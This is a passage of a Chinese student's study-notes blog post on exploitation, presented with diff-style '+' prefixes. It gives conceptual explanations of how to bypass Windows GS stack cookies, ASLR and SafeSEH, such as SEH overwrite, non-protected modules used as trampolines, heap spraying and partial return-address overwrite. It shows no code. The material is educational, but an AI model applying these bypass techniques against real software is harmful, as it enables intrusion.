+<p>正是因为GS安全机制存在这些缺陷，所以聪明的攻击者构造出了各种办法来绕过GS保护机制。David Litchfield在2003年提出了一个技术来绕过GS保护机制：如果Cookie被一个不同的值覆盖了，代码会检查是否安装了安全处理例程，如果没有，系统的<strong>异常处理器</strong>就将接管它。</p>
+<p>如果黑客<strong>覆盖掉了一个异常处理结构，并在Cookie被检查前触发一个异常，这时栈中虽然仍然存在Cookie，但是还是可以被成功溢出</strong>。这个方法相当于是利用SEH进行漏洞攻击。可以说，<strong>GS安全机制最重要的一个缺陷是没有保护异常处理器</strong>，但这点上虽然有SEH保护机制作为后盾，但SEH保护机制也是可以被绕过的。</p>
+<h2 id="ASLR缺陷和绕过方法"><a href="#ASLR缺陷和绕过方法" class="headerlink" title="ASLR缺陷和绕过方法"></a>ASLR缺陷和绕过方法</h2><p>ASLR通过增加随机偏移使得攻击变得非常困难。但是，ASLR技术存在很多脆弱性：（1）为了减少虚拟地址空间的碎片，操作系统把随机加载库文件的<strong>地址限制为8位</strong>，即地址空间为256，而且<strong>随机化发生在地址前两个最有意义的字节上</strong>；<br>（2）<strong>很多应用程序和DLL模块并没有采用/DYNAMICBASE的编译选项；</strong><br>（3）很多<strong>应用程序使用相同的系统DLL文件</strong>，这些系统DLL加载后地址就确定下来了，对于<strong>本地攻击，攻击者还是很容易就能获得所需要的地址</strong>，然后进行攻击。</p>
+<p>针对这些缺陷，还有一些其他绕过方法，比如<strong>攻击未开启地址随机化的模块（作为跳板）</strong>、<strong>堆喷洒技术</strong>、<strong>部分返回地址覆盖法</strong>等。</p>
+<h2 id="SEH保护机制缺陷和绕过方法"><a href="#SEH保护机制缺陷和绕过方法" class="headerlink" title="SEH保护机制缺陷和绕过方法"></a>SEH保护机制缺陷和绕过方法</h2><p><strong>当一个进程中存在一个不是/SafeSEH编译的DLL或者库文件的时候，整个SafeSEH机制就可能失效</strong>。因为/SafeSEH编译选项需要.NET的编译器支持，<strong>现在仍有大量第三方库和程序没有使用该编译器编译或者没有启动/SafeSEH选项</strong>。</p>
+<p>目前，较为可行的绕过SafeSEH的方法有：</p>
+<ul>
+<li>利用未开启SafeSEH的模块作为跳板绕过：可以在未启用SafeSEH的模块里找一些跳转指令，覆盖SEH函数指针，由于这些指令在未启用SafeSEH的模块里，因此异常触发时，可以执行到这些指令。</li>
+<li><strong>利用加载模块之外的地址进行绕过</strong>：可以利用加载模块之外的地址，包括从堆中进行绕过或者其他一些特定内存绕过，具体不展开介绍。</li>
+</ul>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本篇介绍了漏洞利用的一些方法，主要介绍了Shellcode的编写与编码、Windows安全防护机制、漏洞利用的进阶技术（包括API函数自搜索、返回导向编程）等。</p>
+<p>内容有一定难度，需要一定基础，关于API函数自搜索一节并不是特别理解，后续复习PE文件结构时会再次结合视频学习。</p>
+
+      </div>
+      <div class="post-tags-categories">
+        
+        <div class="tags">
+          
+            <a href="/tags/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/" class="">
+              软件漏洞
+            </a>
+          
+        </div>
+        
+      </div>
+      
+        <div class="copyright">
+  <ul class="post-copyright">
+    <li class="post-copyright-author">
+    <strong>作者:  </strong>Jan</a>
+    </li>
+    <li class="post-copyright-link">
+    <strong>文章链接:  </strong>
+    <a href="/2023/03/14/lou-dong-li-yong-pian/" target="_blank" title="漏洞利用篇">https://Jan-nku.github.io/2023/03/14/lou-dong-li-yong-pian/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>版权声明:   </strong>
+      本网站所有文章除特别声明外,均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+      许可协议。转载请注明出处!
+    </li>
+  </ul>
+<div>
+      
+    </article>
+    <!-- 上一篇文章和下一篇文章 -->
+    
+      <!-- 文章详情页的上一页和下一页 -->
+<div class="post-nav">
+
+
+
+  
+  <div class="post-nav-prev post-nav-item">
+    <div class="post-nav-img" style="background-size: cover; 
+      background-position: center center;">
+      <img class="lazyload lazyload placeholder" src="https://pic3.zhimg.com/80/v2-7cfc909ebe8d83683909846edd6b5232_1440w.webp" class="lazyload placeholder" data-srcset="https://pic3.zhimg.com/80/v2-7cfc909ebe8d83683909846edd6b5232_1440w.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+    </div>
+    <a href="/2023/03/15/lou-dong-wa-jue-pian/" class="post-nav-link">
+      <div class="title">
+        <i class="fas fa-angle-left"></i> 上一篇:
+        <div class="title-text">漏洞挖掘篇</div>
+      </div>
+      
+      <!-- <div class="content">
+        方法概述漏洞挖掘方法分类静态分析技术方法：词法分析、数据流分析、控制流分析、模型检查、定理证明、符号执行、污点传播分析等
+      </div> -->
+    </a>
+  </div>
+
+
+
+  
+  <div class="post-nav-next post-nav-item">
+    <div class="post-nav-img" style="background-size: cover; 
+      background-position: center center;">
+      <img class="lazyload lazyload placeholder" src="https://picx.zhimg.com/80/v2-9c50d3af0bc62a0e8b6e89e24c769317_1440w.webp" class="lazyload placeholder" data-srcset="https://picx.zhimg.com/80/v2-9c50d3af0bc62a0e8b6e89e24c769317_1440w.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" src="" alt="">
+    </div>
+    <a href="/2023/03/13/ruan-jian-lou-dong-pian/" class="post-nav-link">
+      <div class="title">
+        下一篇: <i class="fas fa-angle-right"></i>
+        <div class="title-text">软件漏洞篇</div>
+      </div>
+      <!-- <div class="content">
+        漏洞漏洞也称为脆弱性(Vulnerability)，是计算机系统的硬件、软件、协议在系统设计、具体实现、系统配置或安全策
+      </div> -->
+    </a>
+  </div>
+
+</div>
+
+    
+    
+
+    <!-- 打赏 -->
+    
+
+    <!-- 分享 -->
+    
+      <!-- https://github.com/overtrue/share.js -->
+<!-- 文章详情页的分享 -->
+<div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+
+<script src="/js/shareJs/social-share.min.js"></script>
+</script>
+
+<style>
+  .social-share {
+    margin: 20px 0;
+  }
+</style>
+
+
+    
+    
+    <!-- 评论 -->
+    <!-- 评论 -->
+
+  <div id="myComment">
+    
+      
+<section id="comments" style="padding: 1em;"
+	class="animated bounceInUp">
+	<div id="vcomment" class="comment"></div>
+</section>
+<style>
+	#comments {
+		background: rgba(255,255,255,0.9);
+	}
+	#veditor {
+		background-image: url('https://img.zcool.cn/community/01a253594c71cfa8012193a329a77f.gif');
+		background-size: contain;
+		background-repeat: no-repeat;
+		background-position: right;
+		background-color: rgba(255, 255, 255, 0);
+		resize: vertical;
+	}
+	#veditor:focus{
+		background-position-y: 200px;
+		transition: all 0.2s ease-in-out 0s;
+	}
+	#vcomment .vcards .vcard .vh .vhead .vtag.vvisitor {
+		background-color: #42b983;
+	}
+	.v[data-class=v] .vbtn:active, .v[data-class=v] .vbtn:hover {
+		color: #42b983;
+		border-color: #42b983;
+	}
+	#vcomment .vcards .vcard .vhead .vsys i {
+		display: none;
+	}
+	/* 底部valine链接 */
+	#vcomment .vpower {
+		display: none;
+	}
+	
+	/* 底下注释是修改 名称和邮箱和网址输入框的样式 */
+	/* #vcomment .vheader {
+		display: flex;
+		justify-content: space-around;
+	}
+	
+	#vcomment .vheader .vnick {
+		width: 31%;
+		border: 2px solid #dedede;
+		padding-left: 10px;
+		padding-right: 10px;
+		border-radius: 5px
+	}
+
+	#vcomment .vheader .vmail {
+		width: 31%;
+		border: 2px solid #dedede;
+		padding-left: 10px;
+		padding-right: 10px;
+		border-radius: 5px
+	}
+
+	#vcomment .vheader .vlink {
+		width: 31%;
+		border: 2px solid #dedede;
+		padding-left: 10px;
+		padding-right: 10px;
+		border-radius: 5px
+	} */
+
+	img.vimg {
+		transition: all 1s;
+		/* 头像旋转时间为 1s */
+	}
+
+	img.vimg:hover {
+		transform: rotate(360deg);
+		-webkit-transform: rotate(360deg);
+		-moz-transform: rotate(360deg);
+		-o-transform: rotate(360deg);
+		-ms-transform: rotate(360deg);
+	}
+
+	#vcomment .vcards .vcard {
+		padding: 15px 20px 0 20px;
+		border-radius: 10px;
+		margin-bottom: 15px;
+		box-shadow: 0 0 4px 1px rgba(0, 0, 0, .12);
+		transition: all .3s
+	}
+
+	#vcomment .vcards .vcard:hover {
+		box-shadow: 0 0 8px 3px rgba(0, 0, 0, .12)
+	}
+
+	#vcomment .vcards .vcard .vh .vcard {
+		border: none;
+		box-shadow: none;
+	}
+</style>
+    
+  </div>
+
+<!-- comment script in themes\hexo-theme-bamboo\layout\_partial\scripts\index.ejs -->
+
+
+  </div>
+
+  <!-- 目录 -->
+  
+<aside id='l_side'>
+  
+    
+      
+        <section class="widget side_blogger">
+  <div class='content'>
+    
+    
+      <div class='text'>
+        
+          <h2>NKU-Jan</h2>
+        
+        
+          <p>CS Blog</p>
+
+        
+        
+          <p><span id="jinrishici-sentence">Jan's Blog</span></p>
+          <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+        
+      </div>
+    
+    
+      <div class="social-wrapper">
+        
+          
+            <a href="/atom.xml"
+              class="social fas fa-rss flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+          
+            <a href="/jan_nku@163.com"
+              class="social fas fa-envelope flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+          
+            <a href="https://github.com/Jan-nku/Jan-nku.github.io"
+              class="social fab fa-github flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+          
+            <a href="tencent://AddContact/?fromId=50&amp;fromSubId=1&amp;subcmd=all&amp;uin=2643292013"
+              class="social fab fa-qq flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+      </div>
+    
+  </div>
+</section>
+
+      
+    
+  
+  
+  
+
+  <div class="layout_sticky">    
+    
+      
+<section class="widget side_toc">
+  
+  <header>
+    
+      <i style="color: " class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+  <div class='content'>
+    <div class="toc-main">
+      <div class="toc-content">
+        <!-- <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A6%82%E5%BF%B5%E5%8F%8A%E7%A4%BA%E4%BE%8B"><span class="toc-text">漏洞利用概念及示例</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A6%82%E5%BF%B5"><span class="toc-text">漏洞利用概念</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%89%8B%E6%AE%B5"><span class="toc-text">漏洞利用手段</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#shell"><span class="toc-text">shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#shellcode"><span class="toc-text">shellcode</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%9A%84%E6%A0%B8%E5%BF%83"><span class="toc-text">漏洞利用的核心</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Exploit%E7%9A%84%E7%BB%93%E6%9E%84"><span class="toc-text">Exploit的结构</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A6%86%E7%9B%96%E4%B8%B4%E6%8E%A5%E5%8F%98%E9%87%8F%E7%A4%BA%E4%BE%8B"><span class="toc-text">覆盖临接变量示例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#verify%E5%87%BD%E6%95%B0%E7%9A%84%E7%BC%93%E5%86%B2%E5%8C%BA"><span class="toc-text">verify函数的缓冲区</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9A%E8%A6%86%E7%9B%96%E4%B8%B4%E6%8E%A5%E5%8F%98%E9%87%8F"><span class="toc-text">漏洞利用：覆盖临接变量</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shellcode%E4%BB%A3%E7%A0%81%E6%A4%8D%E5%85%A5%E7%A4%BA%E4%BE%8B"><span class="toc-text">Shellcode代码植入示例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9A%E4%BB%A3%E7%A0%81%E6%A4%8D%E5%85%A5"><span class="toc-text">漏洞利用：代码植入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E5%86%99shellcode"><span class="toc-text">编写shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99MessageBoxA%E9%9C%80%E8%A6%81%E4%B8%89%E4%B8%AA%E6%AD%A5%E9%AA%A4"><span class="toc-text">用汇编语言编写MessageBoxA需要三个步骤</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Shellcode%E7%BC%96%E5%86%99"><span class="toc-text">Shellcode编写</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Shellcode%E7%BC%96%E5%86%99%E7%9A%84%E9%9A%BE%E7%82%B9"><span class="toc-text">Shellcode编写的难点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%BC%96%E5%86%99Shellcode%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-text">简单编写Shellcode的方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E7%94%A8c%E8%AF%AD%E8%A8%80%E4%B9%A6%E5%86%99%E8%A6%81%E6%89%A7%E8%A1%8C%E7%9A%84Shellcode"><span class="toc-text">第一步：用c语言书写要执行的Shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E6%8D%A2%E6%88%90%E5%AF%B9%E5%BA%94%E7%9A%84%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81"><span class="toc-text">第二步：换成对应的汇编代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E6%A0%B9%E6%8D%AE%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81%EF%BC%8C%E6%89%BE%E5%88%B0%E5%AF%B9%E5%BA%94%E5%9C%B0%E5%9D%80%E4%B8%AD%E7%9A%84%E6%9C%BA%E5%99%A8%E7%A0%81"><span class="toc-text">第三步：根据汇编代码，找到对应地址中的机器码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E5%86%99%E8%BE%93%E5%87%BA%E2%80%9Chello-world%E2%80%9D%E7%9A%84Shellcode"><span class="toc-text">编写输出“hello world”的Shellcode</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Shellcode%E7%BC%96%E7%A0%81"><span class="toc-text">Shellcode编码</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Shellcode%E7%BC%96%E7%A0%81%E7%9A%84%E5%BF%85%E8%A6%81%E6%80%A7"><span class="toc-text">Shellcode编码的必要性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shellcode%E7%BC%96%E7%A0%81%E6%96%B9%E6%B3%95"><span class="toc-text">Shellcode编码方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%82%E6%88%96%E7%BC%96%E7%A0%81"><span class="toc-text">异或编码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E7%A8%8B%E5%BA%8F"><span class="toc-text">编码程序</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E7%A0%81%E7%A8%8B%E5%BA%8F"><span class="toc-text">解码程序</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E4%BB%A3%E7%A0%81%E5%BD%93%E5%89%8D%E6%8C%87%E4%BB%A4%E5%9C%B0%E5%9D%80"><span class="toc-text">获取代码当前指令地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E7%9A%84shellcode%E4%BB%A3%E7%A0%81"><span class="toc-text">完整的shellcode代码</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Windows%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E6%8A%80%E6%9C%AF"><span class="toc-text">Windows安全防护技术</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ASLR"><span class="toc-text">ASLR</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E5%8A%A0%E8%BD%BD%E5%9C%B0%E5%9D%80%E5%8F%98%E5%8C%96"><span class="toc-text">系统加载地址变化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E8%AF%91%E5%99%A8%E9%80%89%E9%A1%B9-DYNAMICBASE"><span class="toc-text">编译器选项-DYNAMICBASE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%9C%B0%E5%9D%80%E5%8F%98%E5%8C%96%E6%83%85%E5%86%B5"><span class="toc-text">查看地址变化情况</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GS-Stack-protection"><span class="toc-text">GS Stack protection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DEP"><span class="toc-text">DEP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SafeSEH"><span class="toc-text">SafeSEH</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9E%E9%A1%BESEH"><span class="toc-text">回顾SEH</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SafeSEH-1"><span class="toc-text">SafeSEH</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SEHOP"><span class="toc-text">SEHOP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9C%B0%E5%9D%80%E5%AE%9A%E4%BD%8D%E6%8A%80%E6%9C%AF"><span class="toc-text">地址定位技术</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%99%E6%80%81shellcode%E5%9C%B0%E5%9D%80%E7%9A%84%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF"><span class="toc-text">静态shellcode地址的利用技术</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E8%B7%B3%E6%9D%BF%E6%8C%87%E4%BB%A4%E7%9A%84%E5%9C%B0%E5%9D%80%E5%AE%9A%E4%BD%8D%E6%8A%80%E6%9C%AF"><span class="toc-text">基于跳板指令的地址定位技术</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E5%96%B7%E6%B4%92%E6%8A%80%E6%9C%AF"><span class="toc-text">内存喷洒技术</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BB%91%E6%9D%BF%E6%8C%87%E4%BB%A4"><span class="toc-text">滑板指令</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#API%E5%87%BD%E6%95%B0%E8%87%AA%E6%90%9C%E7%B4%A2%E6%8A%80%E6%9C%AF"><span class="toc-text">API函数自搜索技术</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E7%94%A8%E6%80%A7Shellcode%E7%9A%84%E7%BC%96%E5%86%99%E9%80%BB%E8%BE%91"><span class="toc-text">通用性Shellcode的编写逻辑</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E4%BD%8Dkernel32-dll"><span class="toc-text">定位kernel32.dll</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E4%BD%8Dkernel32-dll-1"><span class="toc-text">定位kernel32.dll</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E5%87%BD%E6%95%B0"><span class="toc-text">搜索定位目标函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E7%9A%84%E9%80%9A%E7%94%A8%E6%80%A7Shellcode"><span class="toc-text">完整的通用性Shellcode</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%94%E5%9B%9E%E5%AF%BC%E5%90%91%E7%BC%96%E7%A8%8B"><span class="toc-text">返回导向编程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%80%9D%E6%83%B3"><span class="toc-text">基本思想</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-text">示例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8EROP%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">基于ROP的漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%85%B6%E4%BB%96%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4"><span class="toc-text">绕过其他安全防护</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87GS%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6"><span class="toc-text">绕过GS安全机制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ASLR%E7%BC%BA%E9%99%B7%E5%92%8C%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-text">ASLR缺陷和绕过方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SEH%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BC%BA%E9%99%B7%E5%92%8C%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-text">SEH保护机制缺陷和绕过方法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol> -->
+        <div class="toc"></div>
+      </div>
+    </div>
+  </div>
+</section>
+<!-- 手机端目录按钮 -->
+<div id="toc-mobile-btn">
+  <i class="fas fa-list-ul" aria-hidden="true"></i>
+</div>
+
+      
+  <section class="widget side_recent_post">
+    
+  <header>
+    
+      <a style="color: " href='/tags/'><i class="fas fa-book fa-fw" aria-hidden="true"></i><span class='name'>最新文章</span></a>
+    
+  </header>
+
+
+    <div class='content'>
+      
+      <!-- hash算法 -->
+      
+      <div class="aside-list">
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2023/03/17/web-shen-tou-shi-zhan/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://pica.zhimg.com/80/v2-573ac3e25de03fad9c32add5a05e5cfc_1440w.webp" class="lazyload placeholder" data-srcset="https://pica.zhimg.com/80/v2-573ac3e25de03fad9c32add5a05e5cfc_1440w.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">03-17</span>
+                
+              </div>
+              <a class="post-title" href="/2023/03/17/web-shen-tou-shi-zhan/">WEB渗透实战</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2023/03/16/web-an-quan-ji-chu/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://picx.zhimg.com/80/v2-85c31120acff76826ab53ea8934ef4bb_1440w.webp" class="lazyload placeholder" data-srcset="https://picx.zhimg.com/80/v2-85c31120acff76826ab53ea8934ef4bb_1440w.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">03-16</span>
+                
+              </div>
+              <a class="post-title" href="/2023/03/16/web-an-quan-ji-chu/">WEB安全基础</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2023/03/15/lou-dong-wa-jue-pian/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://pic3.zhimg.com/80/v2-7cfc909ebe8d83683909846edd6b5232_1440w.webp" class="lazyload placeholder" data-srcset="https://pic3.zhimg.com/80/v2-7cfc909ebe8d83683909846edd6b5232_1440w.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">03-15</span>
+                
+              </div>
+              <a class="post-title" href="/2023/03/15/lou-dong-wa-jue-pian/">漏洞挖掘篇</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2023/03/14/lou-dong-li-yong-pian/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://pic3.zhimg.com/80/v2-5f7cb7e900b9dcf5354c3d4d2c5cc3c2_1440w.webp" class="lazyload placeholder" data-srcset="https://pic3.zhimg.com/80/v2-5f7cb7e900b9dcf5354c3d4d2c5cc3c2_1440w.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">03-14</span>
+                
+              </div>
+              <a class="post-title" href="/2023/03/14/lou-dong-li-yong-pian/">漏洞利用篇</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2023/03/13/ruan-jian-lou-dong-pian/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://picx.zhimg.com/80/v2-9c50d3af0bc62a0e8b6e89e24c769317_1440w.webp" class="lazyload placeholder" data-srcset="https://picx.zhimg.com/80/v2-9c50d3af0bc62a0e8b6e89e24c769317_1440w.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">03-13</span>
+                
+              </div>
+              <a class="post-title" href="/2023/03/13/ruan-jian-lou-dong-pian/">软件漏洞篇</a>
+            </div>
+          </div>
+        
+      </div>
+    </div>
+  </section>
+
+    
+  </div>
+</aside>
+
+
+  <!-- 图片放大 Wrap images with fancybox support -->
+  <script src="/js/wrapImage.js"></script>
+</div>
+
+<!-- 文章详情页背景图 -->
+<div id="appBgSwiper" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -2;"
+	:style="{'background-color': bgColor ? bgColor : 'transparent'}">
+	<transition-group tag="ul" :name="names">
+		<li v-for='(image,index) in img' :key='index' v-show="index === mark" class="bg-swiper-box">
+			<img :src="image" class="bg-swiper-img no-lazy">
+		</li>
+	</transition-group>
+</div>
+<script>
+	var vm = new Vue({
+		el: '#appBgSwiper',
+		data: {
+			names: '' || 'fade' || 'fade', // translate-fade fade
+			mark: 0,
+			img: [],
+			bgColor: '',
+			time: null
+		},
+		methods: {   //添加方法
+			change(i, m) {
+				if (i > m) {
+					// this.names = 'fade';
+				} else if (i < m) {
+					// this.names = 'fade';
+				} else {
+					return;
+				}
+				this.mark = i;
+			},
+			prev() {
+				// this.names = 'fade';
+				this.mark--;
+				if (this.mark === -1) {
+					this.mark = 3;
+					return
+				}
+			},
+			next() {
+				// this.names = 'fade';
+				this.mark++;
+				if (this.mark === this.img.length) {
+					this.mark = 0;
+					return
+				}
+			},
+			autoPlay() {
+				// this.names = 'fade';
+				this.mark++;
+				if (this.mark === this.img.length) {
+					this.mark = 0;
+					return
+				}
+			},
+			play() {
+				let bgImgDelay = '' || '180000'
+				let delay = parseInt(bgImgDelay) || 180000;
+				this.time = setInterval(this.autoPlay, delay);
+			},
+			enter() {
+				clearInterval(this.time);
+			},
+			leave() {
+				this.play();
+			}
+		},
+		created() {
+			this.play()
+		},
+		beforeDestroy() {
+			clearInterval(this.time);
+		},
